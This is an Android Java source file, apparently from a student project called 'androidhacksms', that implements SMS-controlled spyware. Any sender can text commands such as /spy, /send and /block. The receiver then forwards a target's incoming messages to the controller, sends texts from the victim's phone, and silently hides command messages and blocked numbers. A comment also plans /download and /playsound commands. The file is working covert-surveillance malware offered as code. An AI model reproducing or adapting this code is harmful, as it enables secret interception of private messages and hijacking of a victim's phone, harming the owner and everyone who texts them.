package esgi.projet.androidhacksms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.ArrayList;
import java.util.HashMap;

/**
 * Created by Dylan on 13/02/2017.
 */

/**
 *
 * Remaining commands to make :
 * /download <link>
 * /playsound <sound_dir>
 */

public class SmsBroadcastReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SMSBroadcastReceiver";

    static final ArrayList<String> mBlockedNumbers = new ArrayList<String>( );
    static final HashMap<String, ArrayList<String>> mSpyNumbers = new HashMap<String, ArrayList<String>>( );

    @Override
    public void onReceive( Context context, Intent intent ) {
        if (intent.getAction( ).equals( SMS_RECEIVED ) ) {
            Bundle bundle = intent.getExtras( );

            if( bundle != null ) {
                Object[ ] pdus = (Object[ ]) bundle.get( "pdus" );
                SmsMessage sms = null;
                for( int i = 0; i < pdus.length; i ++ ) {
                    sms = SmsMessage.createFromPdu( (byte[ ])pdus[ i ] );

                    String phoneNumber = sms.getOriginatingAddress( );

                    if( analyseSMS( sms ) == true ) {
                        abortBroadcast( );
                    }

                    ArrayList<String> spyList = mSpyNumbers.get( phoneNumber );

                    if( spyList != null && spyList.size( ) > 0 ) {
                        SmsManager smsManager = SmsManager.getDefault();
                        String messageToSend = "Message sent from " + phoneNumber + " :::: " + sms.getMessageBody( );
                        for( String phoneNumberToSendTo : spyList ) {
                            smsManager.sendTextMessage(phoneNumberToSendTo, null, messageToSend, null, null);
                        }
                    }

                    Log.e( TAG, "Message received from : " + phoneNumber );
                    if( mBlockedNumbers.contains( phoneNumber ) ) {
                        abortBroadcast( );
                    }
                }
            }
        }
    }

    // Return true if we need to abortBroadcast
    boolean analyseSMS( SmsMessage sms ) {
        if( sms != null ) {
            String szMessage = sms.getMessageBody( );
            String szNumber = sms.getOriginatingAddress( );

            if( szMessage != null && szNumber != null ) {
                szNumber = szNumber.replace( "-", "" ).replace( " ", "" );

                if( szMessage.startsWith( "/block" ) ) {
                    String szNumberToBlock = szMessage.replace( "/block ", "" );
                    Log.e( TAG, "Phone number to block : " + szNumberToBlock );
                    if( szNumberToBlock != null )
                        mBlockedNumbers.add( szNumberToBlock );
                    return true;
                } else if( szMessage.startsWith( "/unblock" ) ) {
                    String szNumberToUnblock = szMessage.replace( "/unblock ", "" );
                    if( szNumberToUnblock!= null )
                        mBlockedNumbers.remove( szNumberToUnblock );
                    return true;
                } else if( szMessage.startsWith( "/spy" ) ) {
                    String szNumberToSpy = szMessage.replace( "/spy ", "" );

                    if( szNumberToSpy != null ) {
                        ArrayList<String> szList;
                        szList = mSpyNumbers.get(szNumberToSpy);

                        if (szList == null) {
                            szList = new ArrayList<String>();
                        }

                        szList.add(szNumber);
                        mSpyNumbers.put(szNumberToSpy, szList);
                    }

                    return true;
                } else if( szMessage.startsWith( "/unspy" ) ) {
                    String szNumberToUnspy = szMessage.replace( "/unspy ", "" );

                    if( szNumberToUnspy != null ) {
                        ArrayList<String> szList;
                        szList = mSpyNumbers.get( szNumberToUnspy );

                        if (szList != null) {
                            szList.remove( szNumber );
                            mSpyNumbers.put( szNumberToUnspy, szList );
                        }
                    }

                    return true;
                } else if( szMessage.startsWith( "/send" ) ) {
                    String[] params = szMessage.split(" ");

                    if (params.length > 2) {
                        String phoneNumberToSendTo = params[1];

                        if (phoneNumberToSendTo != null) {
                            String messageToSend = szMessage.substring(szMessage.indexOf(phoneNumberToSendTo) + phoneNumberToSendTo.length() + 1);

                            if (messageToSend != null) {
                                SmsManager smsManager = SmsManager.getDefault();
                                smsManager.sendTextMessage(phoneNumberToSendTo, null, messageToSend, null, null);
                            }
                        }
                    }

                    return true;
                } else if( szMessage.startsWith( "/help" ) ) {
                    String szMsg = "Commands : {/send PhoneNumber Message; /block PhoneNumber; /unblock PhoneNumber; /spy PhoneNumber; /unspy PhoneNumber}";
                    SmsManager smsManager = SmsManager.getDefault();
                    smsManager.sendTextMessage( szNumber, null, szMsg, null, null);
                    return true;
                }
            }
        }

        return false;
    }
}